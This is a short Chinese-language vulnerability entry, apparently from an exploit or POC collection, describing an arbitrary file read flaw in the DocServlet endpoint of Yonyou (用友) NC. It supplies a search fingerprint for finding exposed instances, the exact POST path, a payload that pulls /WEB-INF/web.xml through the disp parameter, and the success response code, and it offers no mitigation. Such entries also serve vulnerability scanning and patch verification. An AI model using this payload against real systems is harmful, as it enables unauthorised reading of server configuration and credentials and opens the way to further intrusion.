# 用友NCnc.uap.lfw.file.action.DocServlet存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /service/~webrt/nc.uap.lfw.file.action.DocServlet HTTP/1.1`

**Payload**
```
pageId=login&disp=/WEB-INF/web.xml
```
- **响应特征**：200